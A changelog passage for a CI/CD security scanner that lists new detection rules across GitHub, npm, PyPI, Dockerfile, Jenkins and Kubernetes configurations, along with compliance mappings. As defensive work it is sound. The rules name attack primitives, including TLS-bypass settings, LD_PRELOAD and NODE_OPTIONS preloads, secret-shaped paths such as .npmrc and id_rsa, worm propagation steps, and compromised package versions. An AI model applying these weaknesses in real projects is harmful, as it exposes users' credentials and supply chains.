  plus a representative slice of `GHA-*` workflow rules anchoring
  1.5.2 (CI/CD pipeline instructions). Adds `--standard cis_github`
  filtering and a generated `docs/standards/cis_github.md` page.
  Brings the standards count to 15.

- **Smart `pipeline_check init`.** ``init`` now runs one scan against
  whatever pipeline it auto-detects, writes
  ``.pipeline-check-baseline.json`` capturing the current failing
  findings, and emits ``.pipeline-check.yml`` with a recommended
  ``gate.fail_on`` plus a baseline pointer so the first CI run after
  ``init`` returns exit 0 and only new regressions block merges.
  Prints a "top 5 to fix first" summary to stderr (sorted by severity,
  with autofix availability tagged) so the operator has a starting
  point. Pass ``--no-scan`` for the legacy commented-out scaffold,
  ``--baseline-path PATH`` to redirect the baseline file. The
  recommendation logic: any CRITICAL failure → ``fail_on: HIGH``;
  grade A or B → ``MEDIUM``; otherwise ``HIGH``.

- **`pipeline_check explain CHECK_ID` subcommand.** A top-level verb
  wrapping the existing ``--explain`` flag so the per-check reference
  (severity, recommendation, controls, autofix availability, related
  rules, attack chains) is discoverable as a subcommand rather than a
  hidden option. Same exit-code contract as ``--explain``: 0 on a known
  ID, 3 on unknown with a "did you mean" list. The smart-init top-5
  summary and the gate-failure trailer point users at this form.

- **Gate-failure trailer.** When the gate fails, ``pipeline_check``
  now emits a single ``[gate] next:`` line after the failure reasons
  with the most actionable next move based on the failing set: an
  autofix command when fixers cover at least one failure, a
  ``--write-baseline`` suggestion when no baseline is configured, or
  ``pipeline_check explain <ID>`` for the highest-severity failure
  otherwise. Silent when the gate trips only on attack-chain state
  (nothing actionable in the effective set).

- **`--no-group` flag and grouped terminal output.** The terminal
  reporter now collapses repeated ``(check_id, resource)`` failures
  into one visible row plus a ``+N more on lines X, Y, Z`` follower
  line, so a rule firing across many files no longer drowns the
  report. The detail panel still renders for the representative and
  carries every offending line number. Pass ``--no-group`` to revert
  to the pre-1.x behavior (every finding on its own row). JSON /
  SARIF / JUnit outputs always carry every finding regardless of
  this flag.

- **SCM-042 — active ruleset doesn't require merge queue.**
  LOW. Walks active rulesets targeting the default branch
  looking for an entry with ``type: "merge_queue"``. Pairs
  with SCM-033 (required status checks) as the concurrency-
  hardening complement: SCM-033 ensures CI passes BEFORE
  merge; SCM-042's merge queue ensures CI passes AFTER merge
  in queue order, against the queue's post-merge candidate
  commit. Without it, two PRs that individually pass CI can
  both merge into the same trunk and produce a state where
  the combined diff wasn't validated. No legacy branch-
  protection analog. Mapped across the 9 frameworks that
  already evidence SCM (OWASP, CIS, Scorecard, ESF, NIST
  800-53, SOC 2, NIST CSF 2.0, NIST SSDF, PCI DSS); SLSA's
  build-track scope doesn't extend to merge ordering so left
  off.

- **SCM-041 — active ruleset doesn't gate on a deployment
  environment.** LOW. Walks active rulesets targeting the
  default branch looking for a ``required_deployments`` entry
  whose ``parameters.required_deployment_environments`` is a
  non-empty list. Fires when none is found, when the list is
  empty, or when params are absent. Complements SCM-023
  (environment missing reviewers) and SCM-024 (environment
  branch policy missing): SCM-023/024 ensure the environment
  itself is gated; SCM-041 makes a successful deployment to
  that environment a merge prerequisite. Without it, a PR can
  merge without a smoke-test deployment having run, even when
  the environment is rigorously configured. No legacy branch-
  protection analog; passes silently with absence-not-coverage
  language when no rulesets / no targeting rulesets are
  configured. Mapped across all 9 frameworks that already
  evidence SCM (OWASP, CIS, Scorecard, ESF, NIST 800-53, SOC 2,
  NIST CSF 2.0, NIST SSDF, PCI DSS); SLSA's build-track scope
  doesn't extend to post-build deployment gating so left off.

- **SCM-040 — active ruleset doesn't gate on code scanning
  results.** LOW. Walks the merged ``rules`` array on every
  active ruleset looking for a ``code_scanning`` entry whose
  ``parameters.code_scanning_tools`` is a non-empty list.
  Fires when none is found, when the tools list is empty, or
  when params are missing entirely. Turns a passive code-
  scanning configuration (SCM-003 — default setup is on)
  into an active merge gate: the PR can't merge until the
  scan completes for the head SHA *and* the configured
  alerts threshold isn't crossed. Closes the asymmetry
  between code scanning being enabled and the org actually
  blocking on its results. The rule_type is GHAS-licensed
  so repos on free / team tier can't configure it; the
  ``known_fp`` note carries the suppression rationale and
  points operators at SCM-033 (status checks) as the
  no-GHAS fallback. Passes silently when no rulesets are
  configured with absence-not-coverage language (no legacy
  branch-protection analog for code-scanning gating).

- **SCM-039 — active ruleset doesn't pin a required workflow.**
  LOW. Walks the merged ``rules`` array on every active ruleset
  looking for a ``workflows`` entry whose
  ``parameters.workflows`` is a non-empty list. Fires when none
  is found, when the list is empty, or when params are
  missing entirely. Closes a gap that SCM-033 (status checks)
  doesn't cover: ``required_status_checks`` gates on a context
  *name* the workflow chooses to report — a PR that edits the
  workflow YAML in its own branch to remove or rename that
  context bypasses the gate. The ``workflows`` rule pins the
  workflow file at a vetted ref (``main`` or a specific SHA) so
  GitHub forces that workflow to run against the PR's code
  regardless of what the PR did to the workflow YAML. The
  scan-removal-resistant variant. Passes silently when no
  rulesets are configured — the rule_type is ruleset-only, no
  legacy branch-protection analog — with description language
  that says the gate doesn't exist rather than implying it's
  enforced elsewhere.

- **SCM-038 — active ruleset doesn't require linear history.** LOW.
  Walks the merged ``rules`` array on every active ruleset looking
  for an entry with ``type: "required_linear_history"``. Fires when
  none is found. Merge commits aren't a direct attacker primitive
  (force-push, SCM-034, is the history-rewrite surface), but they
  muddy ``git log --first-parent`` triage and git-bisect during
  incident response and hide which specific commits landed when a
  long-lived feature branch is merged. Pairs with SCM-036 (signed
  commits) for tamper-evident linear history. Unlike SCM-033..037
  the rule has no legacy branch-protection analog — the
  ``required_linear_history`` rule_type is ruleset-only — so the
  rule passes silently when no rulesets are configured with a
  description that names the absence-not-coverage state explicitly.

- **Two new dependency-supply-chain providers: `npm` and `pypi`.**
  Lockfile / manifest static analysis, no `npm install`, no `pip
  install`, no registry pull. The first cut of the "dependency
  security" coverage gap pipeline-check carried until now: the
  existing packs flag *CI patterns* that mishandle dependencies
  (Dockerfile `RUN npm install` without `--ignore-scripts`, GHA
  build-tool PPE), but couldn't see the dependency files themselves.
  - **`--pipeline npm` / `--npm-path`** scans `package.json` and
    `package-lock.json` / `npm-shrinkwrap.json` (both npm 6 v1 and
    npm 7+ v2/v3 lockfile schemas). Auto-detected when `package.json`
    is present at cwd. Skips `node_modules/` so vendored manifests
    don't dilute the signal.
    - **NPM-001** — `package.json` dependency uses a floating range
      (`^`, `~`, `*`, `latest`, `>=`) instead of an exact pin. A
      poisoned patch release reaches the build on the next install
      without any code change (TanStack / axios pattern). Skips
      `workspace:*`, `file:`, `link:`, and git URLs (NPM-005's
      surface).
    - **NPM-002** — `package-lock.json` entry has a `resolved` URL
      but no `integrity` SHA. A registry that swaps the tarball
      mid-flight (cache poisoning, MITM, malicious mirror) ships
      arbitrary code with nothing to compare against.
    - **NPM-003** — lockfile entry resolves from a non-registry
      source: `git+ssh://`, `http://`, `git+https://` without a
      40-char commit SHA pin, or `file:` pointing outside the
      project tree. Opaque to verification on the next install.
    - **NPM-004** — `package.json` declares `preinstall` / `install`
      / `postinstall` / `prepare`. Install-time scripts run on
      every consumer's machine with their `NPM_TOKEN` / `GH_TOKEN`
      / AWS env, the Shai-Hulud worm's propagation primitive on the
      *publisher* side.
    - **NPM-005** — git dependency uses a mutable ref (`#main`,
      `#v1.2.3`, or no `#` at all → default-branch HEAD) rather
      than a 40-char commit SHA. Anyone with push access to the
      upstream repo can swap the contents without changing the
      dependency string.
  - **`--pipeline pypi` / `--pypi-path`** scans `requirements.txt`,
    `requirements*.txt`, `requirements/*.txt`, and `*.in` (pip-tools
    inputs). Auto-detected when `requirements.txt` is present at cwd.
    - **PYPI-001** — requirement line lacks an exact `==` pin.
      `*.in` files are exempt (declarative inputs; pinning belongs
      in the compiled `*.txt`).
    - **PYPI-002** — file lacks `--require-hashes` at the top, or
      at least one line is missing `--hash=sha256:...`. A registry
      that swaps the artifact bytes ships unverified code; hash
      pinning is the lockfile layer pip understands. `*.in` exempt.
    - **PYPI-003** — `--index-url http://...`, `--extra-index-url
      http://...`, or `--trusted-host` (the latter also silently
      disables hash checking for the named host even when
      `--require-hashes` is set). Complements DF-021's `RUN pip
      install` shell-flag detection.
    - **PYPI-004** — VCS requirement (`git+https://...@<ref>`,
      `-e git+...@<ref>#egg=foo`) uses a non-SHA ref or no ref at
      all. Same mutable-upstream risk as NPM-005.
    - **PYPI-005** — file declares `--extra-index-url`. pip queries
      every declared index for every package name and picks the
      highest version, the dependency-confusion vector
      (Birsan 2021, `torchtriton` 2022). Single-index installs with
      a transparently-mirrored proxy eliminate the surface.

- **GHA-051..055 — advanced PPE / credential-leak surface (5 new
  GitHub Actions rules).** Each closes a real attack surface the
  existing GHA pack didn't see.
  - **GHA-051** — ``services.<name>.image`` / ``container.image``
    not pinned by ``@sha256:`` digest. MEDIUM.
  - **GHA-052** — ``actions/cache@*`` key includes attacker-
    controllable PR input (``github.head_ref`` /
    ``pull_request.title`` / ``...body`` etc.). HIGH. Cache-
    poisoning detection on the workflow-author side.
  - **GHA-053** — ``if:`` predicate evaluates attacker-
    controllable expression context. HIGH. A crafted payload
    inside ``head_commit.message`` / ``pull_request.title`` is
    parsed by the expression evaluator (and thus by an attacker)
    rather than compared as a literal.
  - **GHA-054** — ``actions/checkout`` with ``ssh-key`` AND
    default ``persist-credentials: true``. HIGH. SSH deploy key
    persists in ``.git/config`` after checkout; subsequent
    untrusted code in the same job inherits it (the SSH-key
    analog of GHA-037 ArtiPacked).
  - **GHA-055** — reusable workflow ``outputs:`` value
    references ``${{ secrets.* }}``. HIGH. Outputs cross the
    workflow boundary into the caller's ``needs.<job>.outputs.*``
    *without* GitHub's secret-masking following — third secret-
    leak sink the existing log-surface rules don't cover.

- **DF-026..030 — Dockerfile ENV-based runtime-bypass detection (5
  new rules).** Extends DF-023 (loader hijack via ``LD_PRELOAD`` /
  ``LD_LIBRARY_PATH`` / ``LD_AUDIT``) to the language-runtime and
  toolchain TLS-bypass / preload surfaces that bake into the image:
  - **DF-026** (HIGH) — ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0``
    disables Node.js TLS verification. Every Node process the
    image launches (incl. ``npm install`` / ``npm publish`` /
    runtime ``fetch`` / postinstall scripts) accepts any
    certificate the upstream presents.
  - **DF-027** (HIGH) — ``ENV PYTHONHTTPSVERIFY=0`` disables
    Python stdlib TLS verification. The env-var counterpart to
    the pip-flag bypass DF-021 already catches; affects every
    ``urllib``-using library.
  - **DF-028** (HIGH) — ``ENV GIT_SSL_NO_VERIFY=1`` (or any
    truthy form, ``true`` / ``yes`` / ``on``) disables Git TLS
    verification. Every ``git clone`` / ``git fetch`` /
    ``git+https://`` dep install in or downstream of the image
    accepts any certificate.
  - **DF-029** (HIGH) — ``ENV REQUESTS_CA_BUNDLE`` points at
    ``/dev/null`` or an empty string. ``requests`` treats the
    empty bundle as "verify against nothing"; covers pip, AWS
    CLI, Django, every Python network client that flows through
    ``requests``.
  - **DF-030** (MEDIUM) — ``ENV NODE_OPTIONS`` carries
    ``--require=`` / ``--import=`` (preload arbitrary module on
    every Node startup, the Node equivalent of ``LD_PRELOAD``)
    or ``--inspect`` / ``--inspect-brk`` (V8 inspector port, full
    debugger control to anyone who can reach the port).

- **SCM-033..037 — ruleset rule-type coverage (5 new SCM rules).**
  Completes the ruleset analog of legacy branch protection. Each
  rule fires when an active ruleset is missing the specific
  rule type that mirrors a legacy-BP control:
  - **SCM-033** (MEDIUM) — no ``required_status_checks`` rule (or
    empty contexts list) — ruleset analog of SCM-008.
  - **SCM-034** (MEDIUM) — no ``non_fast_forward`` rule —
    ruleset analog of SCM-007 (force-push denial). Without it,
    targeted refs can be force-pushed and history rewritten.
  - **SCM-035** (LOW) — no ``deletion`` rule — ruleset analog
    of SCM-009. Targeted refs can be deleted by anyone with push
    access.
  - **SCM-036** (MEDIUM) — no ``required_signatures`` rule —
    ruleset analog of SCM-006. Without it, commits with arbitrary
    author metadata land without a verifiable tie to a
    contributor key.
  - **SCM-037** (MEDIUM) — ``pull_request`` rule has
    ``dismiss_stale_reviews_on_push: false`` — ruleset analog of
    SCM-012. Without dismissal, an approving review on an early
    benign version of a PR continues to count after the head
    changes; the required-review gate documents intent rather
    than reality.
  All five reuse the existing rulesets snapshot slot and the
  ``_detail_unavailable`` sentinel; each passes silently when
  no rulesets are configured because legacy branch protection's
  SCM-006..012 carry the corresponding gates.

- **SCM-032 — active ruleset doesn't require a PR review.** HIGH.
  Walks the merged ``rules`` array on every active ruleset
  looking for a ``pull_request`` entry with
  ``parameters.required_approving_review_count >= 1``. Fires
  when none is found. The ruleset analog of SCM-002 (legacy
  branch protection requires PR reviews) — operators often
  create rulesets for specific governance signals (commit-
  message patterns, tag patterns) and forget that the PR-review
  gate is a separate rule type that has to be added explicitly.
  Passes silently when no rulesets are configured (legacy
  branch protection's SCM-002 covers the gap).

- **SCM-031 — repo allows auto-merge.** MEDIUM. Reads
  ``allow_auto_merge`` from the already-fetched repo metadata
  (no new endpoint) and fires when ``true``. Auto-merge runs
  the merge the moment required status checks pass — including
  any already-approved reviews on the PR — with no further
  human gate on *when* the merge happens. The compositional
  risk: combined with SCM-018 (PR-review bypass) or SCM-021
  (Actions can self-approve PRs), a workflow that opens its own
  PR can satisfy its own gate and land code into main with no
  human at the merge moment. Orgs pairing auto-merge with
  strong required-reviews + CODEOWNERS + last-push approval +
  no-Actions-self-approval suppress with a rationale that names
  the compensating controls.

- **SCM-030 — repository ruleset has bypass actor with
  ``bypass_mode: always``.** HIGH. For every ``active`` ruleset
  the snapshot hydrator now fetches per-ruleset details
  (``bypass_actors`` + ``rules`` live behind a per-id GET; the
  list endpoint only returns ``enforcement``). The rule walks
  ``bypass_actors`` and flags every entry whose
  ``bypass_mode`` is ``always`` and whose ``actor_type`` is not
  ``Integration`` (GitHub App bypasses are auditable via the
  App's invocation channel and so are a documented escape
  hatch). ``pull_request`` mode is the safe shape: the bypass
  flows through a PR review thread that leaves an audit trail.
  Non-active rulesets are SCM-029's surface and skipped here.

- **SCM-029 — repository ruleset is in evaluate / disabled mode.**
  MEDIUM. Walks ``GET /repos/{owner}/{repo}/rulesets`` and flags
  every entry whose ``enforcement`` is anything other than
  ``"active"`` (i.e., ``"evaluate"`` preview-mode or
  ``"disabled"`` explicit-off). The legacy-branch-protection
  rules in this pack (SCM-001..010) do NOT see rulesets, so an
  org that has migrated to rulesets can pass the entire legacy
  pack while every actual governance signal sits in evaluate
  mode (rules run, surface what *would* have been blocked, but
  never actually block). Passes silently when no rulesets are
  configured (legacy branch protection carries the load). The
  hydrator adds a new ``rulesets`` snapshot slot fed by the
  rulesets endpoint.

- **SCM-028 — private repo allows forking.** MEDIUM. Reads
  ``private`` and ``allow_forking`` from the repo metadata and
  fires when both are true. Forks inherit the code into the
  forker's personal namespace (a separate visibility / 2FA / PAT
  surface); if any workflow uses ``pull_request_target``
  (GHA-027) or runs on fork PRs (GHA-046), Actions secrets reach
  the fork execution context. Public repos pass (forking is
  expected); private repos that explicitly disable forking pass.
  The org-policy gate complementing the workflow-layer fork-PR
  rules.

- **SCM-027 — outside collaborator holds write / maintain / admin
  access.** HIGH. Walks ``GET /repos/{owner}/{repo}/collaborators
  ?affiliation=outside`` and flags every entry whose
  ``permissions`` block has any of ``admin: true``, ``maintain:
  true``, or ``push: true``. Outside collaborators bypass the
  org's user-lifecycle controls — when the contractor's term
  ends, the entry stays until somebody manually removes it. The
  rule reports the *most-elevated* tier per collaborator
  (admin > maintain > push) so the operator can prioritize, and
  appends a truncation note when GitHub returns exactly 100
  entries (the per-page cap; pagination is bounded to one page
  to keep scan cost predictable). Requires admin scope; silent-
  pass with an unavailability note otherwise.

- **SCM-026 — webhook ships events insecurely (HTTP / no-TLS /
  no-secret).** HIGH. Walks ``GET /repos/{owner}/{repo}/hooks``
  and flags any active webhook hitting one or more failure modes:
  ``config.url`` is plain ``http://`` (push payloads incl. diffs
  go over the wire unencrypted); ``config.insecure_ssl == "1"``
  (TLS verification disabled); ``config.secret`` is null /
  missing (no HMAC signature — anyone who learns the URL can
  forge events into the receiver). Each finding lists every
  failure mode hit per webhook so the operator sees the full
  fix scope. Inactive webhooks are skipped (they don't fire).
  Requires admin scope; silent-pass with unavailability note
  otherwise. GitHub masks the actual secret value as
  ``"********"`` in API responses so the rule never handles a
  credential directly — it detects absence, not contents.

- **SCM-025 — repo has write-enabled deploy keys (push backdoor).**
  HIGH. Walks ``GET /repos/{owner}/{repo}/keys`` and flags every
  deploy key whose ``read_only`` is false. Deploy keys are repo-
  scoped SSH credentials that bypass GitHub's RBAC — anyone with
  the private half can push directly, side-stepping branch
  protection (SCM-001), required reviews (SCM-002), CODEOWNERS
  (SCM-011), and the user-account audit trail. Requires admin
  scope on the repo (silently passes with an unavailability note
  otherwise; same pattern the rest of the SCM-NNN pack uses).
  Closes the perimeter-security gap that branch-protection rules
  alone can't see: SSH-key-based push bypass.

- **SCM-020..024 — Actions governance + deployment-environment
  protection.** Five new SCM-pack rules backed by three new GitHub
  REST endpoints (``actions/permissions``,
  ``actions/permissions/workflow``, ``environments``).
  - **SCM-020** — Default workflow GITHUB_TOKEN scope is ``write``.
    HIGH. Workflows that don't declare their own ``permissions:``
    block get repo-wide write by default — the GHA-048 / GHA-049
    worm-propagation primitive at the org / repo level. The
    ``read`` default is what blocks Shai-Hulud-style transitive-
    dependency compromises from immediately reaching write APIs.
  - **SCM-021** — Actions can submit PR reviews
    (``can_approve_pull_request_reviews: true``). HIGH. With it
    on, any workflow with ``pull-requests: write`` can satisfy
    SCM-002 / SCM-011 / SCM-014's required-review gate by
    approving its own PR — required-review controls become
    advisory.
  - **SCM-022** — ``allowed_actions: all``. MEDIUM. No allow-list
    on action sources; any workflow can ``uses: random/unknown@v1``
    and CI executes it without further policy review. The org-
    level complement to GHA-040..047's workflow-time signal pack.
  - **SCM-023** — Deployment environment lacks a required-
    reviewer rule. HIGH. Any workflow targeting the environment
    deploys without a human gate — the deploy-side equivalent of
    the GHA-050 publish-without-OIDC failure.
  - **SCM-024** — Deployment environment can deploy from any
    branch (no ``deployment_branch_policy``). MEDIUM. A feature-
    branch workflow can target production directly; reviewers
    approve a stale or wrong-branch deployment without realizing.
  All five require ``admin`` scope on the repo; without it the
  underlying endpoints return 403 and each rule passes silently
  with an "endpoint unavailable" note (same pattern the
  existing ``security_and_analysis``-driven rules use). The SCM
  snapshot dataclass gained three new slots
  (``actions_permissions``, ``actions_workflow_permissions``,
  ``environments``) and ``SCMContext.for_repo`` hydrates them
  alongside the existing branch-protection + CODEOWNERS calls.

- **NPM-011 — `package.json` `files` field leaks secret-shaped paths.**
  Static positive-list audit on the manifest's ``files`` entries.
  Flags any path matching ``.env`` / ``.env.<suffix>``, ``.npmrc``
  (which would publish an ``_authToken`` line), TLS / signing key
  extensions (``.pem`` / ``.key`` / ``.crt`` / ``.p12`` / ``.pfx``),
  SSH private-key filenames (``id_rsa`` / ``id_dsa`` /
  ``id_ecdsa`` / ``id_ed25519``), AWS-style credential blobs
  (``credentials`` / ``credentials.json`` / ``.aws/``), and
  credential-directory trees (``.ssh/`` / ``.gnupg/``). HIGH
  severity. Real-world surface — published npm packages have
  leaked AWS keys via ``.env``, npm auth tokens via ``.npmrc``,
  and SSH private keys via committed dotfiles. Reserves NPM-008..
  010 for the deferred registry-fetch rules (cooldown, transitive-
  diff, audit-signatures) per ROADMAP. Per-entry severity
  escalation added to NPM-006 / PYPI-006 alongside this rule — a
  HIGH-only registry match (protestware like node-ipc) now
  reports HIGH instead of being upgraded to the rule-level
  CRITICAL default.

- **NPM-007 — `.npmrc` ignore-scripts enforcement.** File-side
  complement to DF-024: scans every ``.npmrc`` in the npm scan path
  (excluding ``node_modules``) and flags any that don't declare
  ``ignore-scripts=true``. Three failure shapes: explicit re-enable
  (``ignore-scripts=false``), unrecognized value, and the default
  case where the key isn't set (npm's built-in is to run scripts).
  Where DF-024 protects the image build, NPM-007 protects developer
  laptops and unattended CI ``npm install`` steps that run outside
  a Docker layer. The npm loader gained an ``NpmRc`` file kind and
  an INI-style parser tolerant of comments (``#``/``;``), quoted
  values, and trailing whitespace; the orchestrator routes
  ``NpmRc``-annotated rules through the same dispatch the manifest /
  lock rules use.

- **NPM-006 / PYPI-006 — curated compromised-package registries.**
  Hand-curated, append-only lookup tables of `(name, version,
  advisory)` triples sourced from public CVEs / GHSAs / vendor
  postmortems. Same shape as the existing GHA-040
  `_compromised_actions.py` registry: no network, no telemetry,
  refresh by PR with the citing advisory in the commit message.
  - **NPM-006** seeded with event-stream 3.3.6 (Nov 2018 Copay
    backdoor), ua-parser-js 0.7.29 / 0.8.0 / 1.0.0
    (CVE-2021-43547, Oct 2021 maintainer takeover + miner /
    stealer), coa 2.0.3+ and rc 1.2.9+ (GHSA-73qr-pfmq-6rp8 /
    GHSA-g2q5-5433-rhrf, Nov 2021 coordinated campaign), and
    node-ipc 10.1.1-10.1.3 (CVE-2022-23812, Mar 2022 protestware).
    Walks both `lockfileVersion: 1` (npm 6) and `lockfileVersion:
    2`/`3` (npm 7+) schemas; catches transitive matches the
    `package.json` declaration never mentioned.
  - **PYPI-006** seeded with ctx 0.2.2-0.2.8 (May 2022 hijacked-
    package env-var exfil) and requests-darwin-lite 2.27.1
    (GHSA-7gjg-3qcj-9jvg, May 2024 Geneva-framework typosquat).
    PEP 503 name normalization on lookup so `requests_darwin_lite`,
    `requests-darwin-lite`, and `Requests.Darwin.Lite` all resolve
    to the same registry entry.

- **5 new rules covering the Shai-Hulud / TanStack / axios npm worm
  pattern.** Each one closes a specific leg of the postinstall-driven
  supply-chain compromise loop that the existing lockfile-pinning /
  SHA-pinning rules were blind to (a pinned lockfile is no defense
  when the pinned version itself is poisoned).
  - **DF-024** — `RUN npm install` / `npm ci` / `yarn install` /
    `pnpm install` without `--ignore-scripts` runs lifecycle hooks
    (`preinstall`, `install`, `postinstall`, `prepare`) with the
    builder's environment. A single compromised dependency anywhere
    in the transitive tree gets to read `NPM_TOKEN`, `GH_TOKEN`,
    `AWS_*`, and `~/.npmrc`. Detection short-circuits when the image
    sets `ENV NPM_CONFIG_IGNORE_SCRIPTS=true` or
    `ENV YARN_ENABLE_SCRIPTS=false` as a kill-switch.
  - **DF-025** — `RUN` body writes a registry auth line into a
    Docker layer (`//registry.npmjs.org/:_authToken=...`, npm
    `_password` / `_auth`, or pip credentials embedded in
    `index-url`). The token is recoverable from the image with
    `docker save` even if a later step deletes the file. BuildKit
    secret mounts (`--mount=type=secret`) are the documented fix.
  - **GHA-048** — workflow step writes a file under
    `.github/workflows/` via redirect, `tee`, `cp`, `mv`, heredoc,
    or templating tool. There is no legitimate non-automation reason
    for an in-CI step to author a sibling workflow; the Shai-Hulud
    worm used exactly this primitive to push
    `shai-hulud-workflow.yml` into every repo the stolen
    `GITHUB_TOKEN` could reach.
  - **GHA-049** — workflow step pushes to a parameterized
    cross-repo destination: `git push` to a URL interpolated from
    `${{ ... }}` / `$VAR`, `gh repo create` / `gh repo edit` /
    `gh api -X POST /repos/...` / `gh release` against a non-literal
    target. Benign `git push origin` / `upstream` forms are
    exempted. The second leg of the worm-propagation loop.
  - **GHA-050** — package publish step (`npm publish`,
    `twine upload`, `poetry publish`, `cargo publish`,
    `pypa/gh-action-pypi-publish` with a `password` input, ...)
    runs from a job that has no protected `environment:` and pulls
    a long-lived registry token (`NPM_TOKEN`, `NODE_AUTH_TOKEN`,
    `PYPI_TOKEN`, `TWINE_PASSWORD`, ...). The OIDC trusted-publisher
    path (PyPI PEP 740, npm provenance) plus `environment:` gating
    is the documented fix. A long-lived `NPM_TOKEN` on a runner is
    the fuel that lets a single compromised dep republish more
    poisoned packages on the org's behalf.

- **9 new rules across Jenkins, Kubernetes, and Dockerfile packs.**
  - **JF-033** — `withCredentials` binding referenced through Groovy
    `${VAR}` inside a double-quoted `sh` body bakes the literal
    secret into the shell command before Jenkins' masker sees it, so
    `set -x` prints the credential. The safe pattern is a
    single-quoted Groovy string so the shell, not Groovy, resolves
    the variable.
  - **JF-034** — `parameters { password(name: 'X') }` declares a
    password-typed build parameter. The value lands in
    `builds/<n>/build.xml` on the controller's filesystem and is
    surfaced on the build's parameters page; use the Credentials
    Provider + `withCredentials` instead.
  - **JF-035** — `httpRequest` step with `ignoreSslErrors: true`
    bypasses TLS verification for the HTTP Request plugin call.
  - **K8S-041** — `Service.externalIPs` non-empty (CVE-2020-8554
    surface). Any namespace user with `services/create` can claim
    arbitrary IPs and kube-proxy installs DNAT rules that MITM
    matching traffic.
  - **K8S-042** — RoleBinding / ClusterRoleBinding subject is
    `system:anonymous` or `system:unauthenticated`. Anything bound to
    either resolves for requests with no authentication.
  - **K8S-043** — Ingress rule with wildcard host (`'*'`, `'*.x'`)
    or missing `host:` accepts every Host header the controller
    sees, collapsing hostname-based routing.
  - **DF-021** — `RUN pip install --trusted-host` / `-i http://...`
    fetches Python dependencies without TLS verification, opening a
    build-time MITM supply-chain surface.
  - **DF-022** — `RUN npm install` (or `npm i`) instead of `npm ci`
    re-resolves and mutates the lockfile at build time; the image
    can carry packages the committed lockfile never recorded.
  - **DF-023** — `ENV LD_PRELOAD` / `LD_LIBRARY_PATH` / `LD_AUDIT`
    set in the image apply to every binary the container runs and
    are the standard loader-hijack escalation primitive.

### Changed

- **Broadened PCI DSS v4.0 to full coverage.** Cross-mapping pass:
  no new rule modules, only mapping changes plus 31 net-new entries
  for AWS rules registered but not yet attached to a PCI family.
  Fills **7.2.2** (job classification) by cross-mapping
  PBAC-002 / TKN-007 / ARGO-003 / GCB-013 / GCB-020 (default /
  shared service-account identities) plus CCM-001 (no approval
  rule template) as the change-control surface. Lifts **10.3.3**
  (centralized log backup) off single-rule status with CT-001/003
  (trail = centralized destination) and CWL-001 (retention = backup
  window). New entries also fill Req 10.x / 7.x / 8.x with CT, CWL,
  CW, EB, IAM-007/008, KMS-002, LMB, SIGN, SM, SSM, CA, CCM,
  ECR-006/007, PBAC-003/005. After: 13/13 controls covered, 0 thin,
  227 mappings (was 196).

- **Broadened NIST CSF 2.0 mappings on thin Detect / Respond /
  Recover controls.** No new rule modules; cross-maps existing rules
  to subcategories the registry already had signal for. **DE.CM-06**
  (external-provider monitoring) picks up ECR-006 pull-through
  upstream, CCM-003 cross-account trigger, and SCM-026 webhook.
  **DE.AE-03** (multi-source correlation) picks up CT-001 / CT-003
  multi-region trail and SCM-016 private vuln-reporting intake.
  **RS.MA-01** (incident response) picks up CW-001 alarm and EB-001
  event rule as the trigger surfaces. **RC.RP-01** (recovery) picks
  up ECR-002 (mutable tags break recovery-by-digest). The GV.SC-08
  (supplier incident planning) gap is documented inline; the control
  is contractual / process and has no manifest signal to evidence
  against.

- **Broadened CIS AWS Foundations mappings on thin controls.** No
  new rule modules; cross-maps four existing rules. **1.16**
  (over-broad principal) picks up CCM-003 cross-account triggers
  and EB-002 wildcard EventBridge targets — the same admin-privilege
  shape the control calls out for IAM. **4.16** (Security Hub
  posture) picks up CW-001 CodeBuild failure alarms and EB-001
  pipeline-failure events, mirroring the existing ECR-scanning
  mapping pattern. The two uncovered controls (1.17 support role,
  4.3 root-account alarm) are documented inline so future
  contributors know they need net-new rules, not mappings.

- **Broadened CIS SSCS / Kubernetes / GitHub control coverage.**
  Cross-mapping pass; only mapping changes plus a small set of new
  entries for rules already in the registry but absent from each
  standard's table.
  - **CIS SSCS**: 220 → 278 mappings. 4.3.3, 1.1.6, 1.1.8, 1.5.1,
    2.4.2, 4.4.1, 5.2.x audit, and 1.3.4 long-lived tokens
    broadened. SCM-030 bypass also evidences signing. New OCI /
    ATTEST / CT / CWL / SIGN / LMB / CA / EB entries fill
    artifact-provenance and audit-logging surfaces.
  - **CIS Kubernetes**: filled 5.1.4 (pod-create) and 5.7.1
    (namespace boundaries) — the two previously uncovered controls.
    RBAC broadening: K8S-020 / 021 / 042 now evidence the
    wildcard / pod-create / bind+impersonate cluster of 5.1.x. The
    SecurityContext umbrella 5.7.3 now covers every
    securityContext-field rule.
  - **CIS GitHub**: thin-control count 19 → 15. SCM-030 bypass now
    evidences every ruleset-enforced control (signing, linear
    history, admin enforcement, force-push, deletion). CODEOWNERS
    pair (SCM-011 ↔ SCM-017) cross-coupled. SCM-008 strict status
    checks also evidence the "branches up to date" knob.

- **GHA-044 now detects `bun i` and `deno install`.** The
  Direct-PPE rule already caught `bun install`; this extends it to
  the documented `bun i` shorthand and Deno 2.x's `deno install`,
  which resolves project deps from `deno.json` / `package.json` and
  runs npm lifecycle hooks when `--allow-scripts` is set. Mirrors
  the existing `npm run lint` exemption: `bun run` and `deno task`
  target named scripts, not install-time hooks.

- **Added SCM coverage to PCI DSS v4 and SLSA.** PCI DSS gets
  the full SCM range (40 rules); SLSA gets a narrow selection
  (11 rules) since most SCM rules cover review-control
  governance outside SLSA's build-track scope.
  - **PCI DSS v4**: 154/526 → 194/526 (+40 rules, full SCM
    range). 6.4.3 (Change control) and 6.5.1 (Secure
    development procedures) carry the branch-protection /
    review-control / ruleset rule-type bulk; 6.3.1 / 6.3.3
    carry scanning/patching surfaces; 6.4.1 carries
    allowed-actions and webhook hygiene; 7.2.x carries
    least-privilege; 8.2.1 carries unique-identifier surfaces
    (signed commits, workflow tokens, deploy keys); 10.3.2
    carries history-protection (force-push, deletion,
    linear-history).
  - **SLSA**: 200/526 → 211/526 (+11 rules, selective).
    Build.L2.Signed carries signed commits (SCM-006/SCM-036)
    as the source-side root of provenance attestation;
    Build.L3.NonFalsifiable carries the history-rewrite /
    governance-bypass surfaces that undermine provenance
    integrity (SCM-007/009 force-push/deletion;
    SCM-029/030 ruleset enforcement; SCM-034/035 ruleset
    force-push/deletion; SCM-038 linear history; SCM-039
    required workflows); Build.L3.Isolated carries SCM-022
    (allowed-actions unrestricted = untrusted 3rd-party in
    build env).

